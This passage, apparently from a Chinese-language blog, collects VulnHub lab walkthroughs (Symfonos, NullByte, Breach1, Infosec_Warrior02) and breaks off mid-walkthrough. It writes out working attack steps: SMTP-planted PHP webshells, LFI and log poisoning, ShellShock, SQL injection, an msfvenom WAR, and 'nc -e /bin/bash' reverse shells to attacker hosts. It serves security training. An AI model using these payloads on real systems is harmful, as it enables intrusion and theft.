使用口令 <code>qwerty</code> 即可登入</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/07.png" alt="" /></p>
<p>查看文本<code>todo.txt</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/08.png" alt="" /><br />
得到信息<code>/h3l105</code></p>
<p>Web主页如图</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/09.png" alt="" /></p>
<p>而且扫描Web目录时并未获取到有效信息<br />
猜测<code>/h3l105</code>为Web目录</p>
<p>访问目录<code>/h3l105</code>，为Wordpress站点</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/10.png" alt="" /></p>
<p>使用wpscan进行扫描</p>
<p><code>wpscan --url http://192.168.88.130/h3l105/ -e ap --plugins-detection Aggressive</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/11.png" alt="" /></p>
<p>查询相关漏洞</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/12.png" alt="" /></p>
<p>使用Telnet连接SMTP服务来写入Webshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.88.130 25</span><br><span class="line">MAIL FROM: &lt;Hacker&gt;</span><br><span class="line">RCPT TO: helios</span><br><span class="line">data</span><br><span class="line">&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;</span><br><span class="line">.</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/13.png" alt="" /></p>
<p>使用LFI来实现GetShell</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/14.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/15.png" alt="" /></p>
<p><code>http://192.168.88.130/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;pass=nc -e /bin/bash 192.168.88.129 8081</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/16.png" alt="" /></p>
<h2 id="权限提升-26"><a class="markdownIt-Anchor" href="#权限提升-26"></a> 权限提升</h2>
<p>查看具有SUID的程序</p>
<p><code>find / -user root -perm -4000 -print 2&gt; /dev/null</code><br />
<img src="/images/vulnhub_walkthrough_set/Symfonos1/img/17.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/18.png" alt="" /></p>
<p>可以进行PATH提权</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos1/img/19.png" alt="" /></p>
<hr />
<blockquote>
<p>SMTP+LFI=GetShell</p>
</blockquote>
<ul>
<li>通过SMTP写入WebShel的内容（需要已知一个系统的用户名）</li>
<li>再利用LFI来执行WebShell（Web包含可以访问/var/mail）</li>
</ul>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://medium.com/@markonsecurity/symfonos-1-walkthrough-vulnhub-df08dbcb0d36">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="symfonos-3"><a class="markdownIt-Anchor" href="#symfonos-3"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/symfonos-31,332/">symfonos 3</a></h1>
<p><code>2020/07/05 15:27:23</code></p>
<h2 id="寻找靶机ip-11"><a class="markdownIt-Anchor" href="#寻找靶机ip-11"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.88.0/24 | grep -B2 VMware</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/00.png" alt="" /></p>
<h2 id="端口扫描-27"><a class="markdownIt-Anchor" href="#端口扫描-27"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.88.130</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/01.png" alt="" /></p>
<h2 id="web路径扫描-11"><a class="markdownIt-Anchor" href="#web路径扫描-11"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.88.130/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/02.png" alt="" /></p>
<h2 id="漏洞利用-27"><a class="markdownIt-Anchor" href="#漏洞利用-27"></a> 漏洞利用</h2>
<p>访问页面，在源代码出得到信息</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/03.png" alt="" /></p>
<p>尝试后发现存在路径<code>/cgi-bin/underworld</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/04.png" alt="" /></p>
<p>使用ShellShock漏洞反弹Shell<br />
<code>curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.88.130/cgi-bin/underworld</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/05.png" alt="" /></p>
<h2 id="权限提升-27"><a class="markdownIt-Anchor" href="#权限提升-27"></a> 权限提升</h2>
<p>获取pty</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/06.png" alt="" /></p>
<p>查找属于用户组hades的文件</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/07.png" alt="" /></p>
<p>查看statuscheck.txt</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/08.png" alt="" /><br />
应该是curl请求的结果</p>
<p>下载pspy</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/09.png" alt="" /></p>
<p>运行pspy之后得到信息</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/10.png" alt="" /><br />
python2脚本<code>ftpclient.py</code>为计划任务</p>
<p>靶机上存在tcpdump</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/11.png" alt="" /></p>
<p>使用tcpdump监听流量<br />
<code>timeout 120 tcpdump -v -i lo port 21</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/12.png" alt="" /></p>
<p>得到账户<code>hades:PTpZTfU4vxgzvRBE</code></p>
<p>使用ssh登入靶机后查看脚本文件</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/13.png" alt="" /><br />
文件不可写，且目录无法操作</p>
<p>查看库文件<code>ftplib</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/14.png" alt="" /><br />
库文件可写</p>
<p>修改库文件中的ftp.quit()函数</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/15.png" alt="" /><br />
插入反弹Shell命令</p>
<p>提权成功</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos3/img/16.png" alt="" /></p>
<hr />
<blockquote>
<p>ShellShock</p>
</blockquote>
<ul>
<li>apache</li>
<li>/cgi-bin/* (200)</li>
</ul>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://infosecjohn.blog/posts/vulnhub-symfonos-3/">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="symfonos-4"><a class="markdownIt-Anchor" href="#symfonos-4"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/symfonos-4,347/">symfonos 4</a></h1>
<p><code>2020/07/20 11:00:24</code></p>
<h2 id="寻找靶机ip-12"><a class="markdownIt-Anchor" href="#寻找靶机ip-12"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/00.png" alt="" /></p>
<h2 id="端口扫描-28"><a class="markdownIt-Anchor" href="#端口扫描-28"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.145</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/01.png" alt="" /></p>
<h2 id="web路径扫描-12"><a class="markdownIt-Anchor" href="#web路径扫描-12"></a> Web路径扫描</h2>
<p><code>gobuster dir -u 192.168.31.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/02.png" alt="" /></p>
<h2 id="漏洞利用-28"><a class="markdownIt-Anchor" href="#漏洞利用-28"></a> 漏洞利用</h2>
<p>访问<code>/atlantis.php</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/03.png" alt="" /></p>
<p>使用SQL注入Bypass登入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&#39; or 1#</span><br><span class="line">password&#x3D;1</span><br></pre></td></tr></table></figure>
<p>登入后跳转至<code>/sea.php</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/04.png" alt="" /></p>
<p>选择Hades之后出现文字内容</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/05.png" alt="" /><br />
也出现了Get参数<code>file</code></p>
<p>访问<code>/gods</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/06.png" alt="" /><br />
可能存在本地文件包含漏洞，且文件名后面会补上<code>.log</code></p>
<p>尝试包含登入日志<br />
<code>/sea.php?file=../../../../var/log/auth</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/07.png" alt="" /><br />
存在本地文件包含漏洞</p>
<p>ssh登入构造Webshell<br />
<code>ssh '&lt;?php system($_GET['pass']); ?&gt;'@192.168.31.145</code></p>
<p>反弹Shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9901</span><br><span class="line">&#x2F;sea.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.31.10 9901</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/08.png" alt="" /></p>
<h2 id="权限提升-28"><a class="markdownIt-Anchor" href="#权限提升-28"></a> 权限提升</h2>
<p>获取tty<br />
<code>python -c 'import pty;pty.spawm(&quot;/bin/bash&quot;)'</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/09.png" alt="" /></p>
<p>查看本地服务<br />
<code>ss -antlp</code><br />
<code>ps -auxwww | grep 127.0.01</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/10.png" alt="" /></p>
<p>端口转发<br />
<code>socat tcp-listen:1234,fork tcp-connect:localhost:8080</code></p>
<p>访问<code>http://192.168.31.145:1234/</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/11.png" alt="" /></p>
<p>查看cookie</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/12.png" alt="" /></p>
<p>Base64解码</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/13.png" alt="" /></p>
<p>可能存在pickle反序列化漏洞，构造反弹Shell的Payload</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/14.png" alt="" /></p>
<p>发送Payload</p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos4/img/15.png" alt="" /><br />
提权成功</p>
<hr />
<blockquote>
<p>jsonpickle反序列化</p>
</blockquote>
<p>在进行反序列化的时候会执行<code>函数reduce</code>类似于php反序列化中的wakeup()</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/symfonos4-vulnhub-walkthrough/">WalkThrough</a><br />
<a target="_blank" rel="noopener" href="https://pentesterjourney.com/tag/symfonos4/">WalkThrough</a><br />
<a target="_blank" rel="noopener" href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">pickel</a></p>
</blockquote>
<hr />
<h1 id="nullbyte"><a class="markdownIt-Anchor" href="#nullbyte"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/nullbyte-1,126/">NullByte</a></h1>
<p><code>2020/07/31 10:52:00</code></p>
<h2 id="寻找靶机ip-13"><a class="markdownIt-Anchor" href="#寻找靶机ip-13"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.31.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/00.png" alt="" /></p>
<h2 id="端口扫描-29"><a class="markdownIt-Anchor" href="#端口扫描-29"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.234</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/01.png" alt="" /></p>
<h2 id="web路径扫描-13"><a class="markdownIt-Anchor" href="#web路径扫描-13"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.31.234/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/02.png" alt="" /></p>
<h2 id="漏洞利用-29"><a class="markdownIt-Anchor" href="#漏洞利用-29"></a> 漏洞利用</h2>
<p>访问Web页面</p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/03.png" alt="" /></p>
<p>下载图片并分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.31.234&#x2F;main.gif</span><br><span class="line">exiftool main.gif</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/04.png" alt="" /></p>
<p>访问目录<code>/kzMb5nVYJw</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/05.png" alt="" /></p>
<p>查看源代码</p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/06.png" alt="" /></p>
<p>使用Burpsuite对POST参数<strong>key</strong>进行爆破<br />
字典文件为<code>/usr/share/wordlists/dirb/big.txt</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/07.png" alt="" /></p>
<p>输入key之后页面变化</p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/08.png" alt="" /></p>
<p>提交<code>usrtosearch</code>参数进行查询</p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/09.png" alt="" /></p>
<p>直接访问<code>420search.php</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/10.png" alt="" /></p>
<p>猜测该php文件可以对数据库进行查询，可能存在SQL注入</p>
<p>提交参数<code>usrtosearch=admin&quot; or 1=1%23</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/11.png" alt="" /></p>
<p>确认存在SQL注入</p>
<p>使用SQLMap</p>
<p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin --dbs --batch</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/12.png" alt="" /></p>
<p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth --tables --batch</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/13.png" alt="" /></p>
<p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users --columns --batch</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/14.png" alt="" /></p>
<p><code>sqlmap -u http://192.168.31.234/kzMb5nVYJw/420search.php?usrtosearch=admin -D seth -T users -C id,position,user,pass --dump --batch</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/15.png" alt="" /></p>
<p>Base64解码</p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/16.png" alt="" /></p>
<p>Hash破解</p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/17.png" alt="" /></p>
<p>使用该账户登入SSH</p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/18.png" alt="" /></p>
<h2 id="权限提升-29"><a class="markdownIt-Anchor" href="#权限提升-29"></a> 权限提升</h2>
<p>查看文件<code>~/.bash_history</code></p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/19.png" alt="" /><br />
存在文件<code>/var/www/backup/procwatch</code></p>
<p>文件执行<code>ps</code>命令，且具有SUID权限</p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/20.png" alt="" /></p>
<p>进行PATH提权</p>
<p><img src="/images/vulnhub_walkthrough_set/NullByte/img/21.png" alt="" /></p>
<hr />
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://medium.com/@pharish4948/vulnhub-null-byte-walkthrough-bde63c1dd38d">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="breach1"><a class="markdownIt-Anchor" href="#breach1"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/breach-1,152/">Breach1</a></h1>
<p><code>2020/09/06 11:35:19</code></p>
<h2 id="寻找靶机ip-14"><a class="markdownIt-Anchor" href="#寻找靶机ip-14"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.110.0/24 | grep -B3 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/00.png" alt="" /></p>
<h2 id="端口扫描-30"><a class="markdownIt-Anchor" href="#端口扫描-30"></a> 端口扫描</h2>
<p><code>nmap --top-port 200 -sV -T5 -v -n 192.168.110.140</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/01.png" alt="" /></p>
<p>目标靶机存在IDS/IPS</p>
<h2 id="web路径扫描-14"><a class="markdownIt-Anchor" href="#web路径扫描-14"></a> Web路径扫描</h2>
<p><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.110.140/</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/02.png" alt="" /></p>
<h2 id="漏洞利用-30"><a class="markdownIt-Anchor" href="#漏洞利用-30"></a> 漏洞利用</h2>
<p>使用浏览器访问Web页面</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/03.png" alt="" /></p>
<p>查看源代码</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/04.png" alt="" /></p>
<p>两次Base64解码后得到<br />
<code>pgibbons:damnitfeel$goodtobeagang$ta</code></p>
<p>图片导向其他页面</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/05.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/06.png" alt="" /></p>
<p>点击<code>Employee portal</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/07.png" alt="" /></p>
<p>使用账户登入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: pgibbons</span><br><span class="line">password: damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/08.png" alt="" /></p>
<p>在第三封邮件中获得有效信息</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/09.png" alt="" /></p>
<p>keystore文件<br />
<code>192.168.110.140/.keystore</code></p>
<p>查看Contributions</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/10.png" alt="" /></p>
<p>可以进一步获得信息</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/11.png" alt="" /></p>
<p>这里可以再获取一个流量包文件<br />
<code>http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</code><br />
并且得知密码为<code>tomcat</code></p>
<p>查看keystore所存储的私钥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -keystore keystore</span><br><span class="line">tomcat</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/12.png" alt="" /></p>
<p>导出p12证书</p>
<p><code>keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12 -deststoretype pkcs12</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/13.png" alt="" /></p>
<p>使用Wireshark分析流量包</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/14.png" alt="" /></p>
<p>目标靶机的8443端口可能存在加密Web服务</p>
<p>导入证书文件<br />
<code>Edit -&gt; Preferences -&gt; Protocols -&gt; TLS -&gt; Edit...</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/15.png" alt="" /></p>
<p>导入之后即可解密TLS流量</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/16.png" alt="" /></p>
<p>对于Basic认证内容进行Base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC&#39; | base64 -d</span><br><span class="line">tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure>
<p>访问<code>https://192.168.110.140:8443/_M@nag3Me/html</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/17.png" alt="" /></p>
<p>认证错误，使用Burpsuite代理</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/18.png" alt="" /></p>
<p>使用账户登入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: tomcat</span><br><span class="line">password: Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure>
<p>构造恶意war包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;9902 -f raw &gt; msf.jsp</span><br><span class="line">zip msf.zip msf.jsp</span><br><span class="line">mv msf.zip msf.war</span><br></pre></td></tr></table></figure>
<p>上传war包</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/19.png" alt="" /></p>
<p>在MSFConsole中进行配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload java&#x2F;jsp_shell_reverse_tcp</span><br><span class="line">set LHOST 192.168.110.3</span><br><span class="line">set LPORT 9902</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>访问URL<code>https://192.168.110.140:8443/msf/msf.jsp</code></p>
<p>MSFConsole中接收到Shell</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/20.png" alt="" /></p>
<h2 id="权限提升-30"><a class="markdownIt-Anchor" href="#权限提升-30"></a> 权限提升</h2>
<p>mysql空口令登入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root</span><br><span class="line">select user,password from mysql.user;</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/21.png" alt="" /></p>
<p>破解MD5值</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/22.png" alt="" /></p>
<p><code>thelaststraw</code></p>
<p>切换账户至milton</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su milton</span><br><span class="line">thelaststraw</span><br></pre></td></tr></table></figure>
<p>下载图片，查看EXIF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.110.140&#x2F;images&#x2F;bill.png</span><br><span class="line">exiftool bill.png</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/23.png" alt="" /></p>
<p>得到密码<br />
<code>coffeestains</code></p>
<p>切换账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su blumbergh</span><br><span class="line">coffeestains</span><br></pre></td></tr></table></figure>
<p>开启本地HTTP服务<br />
<code>python -m SimpleHTTPServer 9900&amp;</code><br />
<img src="/images/vulnhub_walkthrough_set/Breach1/img/24.png" alt="" /></p>
<p>靶机下载pspy<br />
<code>wget http://192.168.110.3:9900/pspy64</code><br />
<img src="/images/vulnhub_walkthrough_set/Breach1/img/25.png" alt="" /></p>
<p>使用pspy</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x pspy64</span><br><span class="line">.&#x2F;pspy64 | grep UID&#x3D;0 &amp;</span><br></pre></td></tr></table></figure>
<p>可以看到root执行的命令<code>/bin/sh -c /usr/share/cleanup/tidyup.sh</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/26.png" alt="" /></p>
<p>查看sudo权限，<a target="_blank" rel="noopener" href="http://xn--teeshelltidy-c86sfa42ubzn74jkraw8few0g3i5f72sc.sh">可以使用tee写反弹shell命令至tidy.sh</a><br />
root执行反弹shell命令之后即可获得root权限</p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/27.png" alt="" /></p>
<p><code>echo 'nc -e /bin/bash 192.168.110.3 9903' | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</code></p>
<p><code>nc -lvnp 9903</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Breach1/img/28.png" alt="" /></p>
<hr />
<blockquote>
<p>keystore</p>
</blockquote>
<p>可以使用keytool查看并导出keystore中所存储的密钥文件</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhuxr/p/9848230.html">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="infosec_warrior02"><a class="markdownIt-Anchor" href="#infosec_warrior02"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-02,447/">Infosec_Warrior02</a></h1>
<p><code>2020/09/09 12:46:57</code></p>
<h2 id="寻找靶机ip-15"><a class="markdownIt-Anchor" href="#寻找靶机ip-15"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.1.0/24 | grep -B3 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/00.png" alt="" /></p>
<h2 id="端口扫描-31"><a class="markdownIt-Anchor" href="#端口扫描-31"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.109</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/01.png" alt="" /></p>
<h2 id="漏洞利用-31"><a class="markdownIt-Anchor" href="#漏洞利用-31"></a> 漏洞利用</h2>
<p>使用nc连接目标56563端口</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/02.png" alt="" /></p>
<p>尝试输入非预期输入</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/03.png" alt="" /></p>
<p>得到报错信息</p>
<p>可以利用input()函数进行RCE<br />
payload: <code>__import__(&quot;os&quot;).system(&quot;/bin/bash&quot;)</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/04.png" alt="" /></p>
<p>获取Shell</p>
<h2 id="权限提升-31"><a class="markdownIt-Anchor" href="#权限提升-31"></a> 权限提升</h2>
<p>SSH登入时得到信息</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/05.png" alt="" /></p>
<p>查看发型版的代号<br />
<code>cat /etc/*release</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/06.png" alt="" /></p>
<p>查看主机名与用户名</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/07.png" alt="" /></p>
<p>构造账户</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/08.png" alt="" /></p>
<p><code>hydra -I -L user -P pass -e n ssh://192.168.1.109</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/09.png" alt="" /></p>
<p>得到账户 <code>ck04:bionic</code></p>
<p>SSH登入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh ck04@192.168.1.109 -p bionic</span><br><span class="line">bionic</span><br></pre></td></tr></table></figure>
<p>输入命令之后ssh断开连接</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/10.png" alt="" /></p>
<p>查看ck04用户的默认Shell</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/11.png" alt="" /></p>
<p>构造反弹shell脚本并执行</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/12.png" alt="" /></p>
<p>获取tty</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/13.png" alt="" /></p>
<p>查看ck04用户的sudo权限并利用</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/14.png" alt="" /></p>
<p>查看bla用户的sudo权限</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/15.png" alt="" /></p>
<p>使用unzip命令覆盖passwd文件</p>
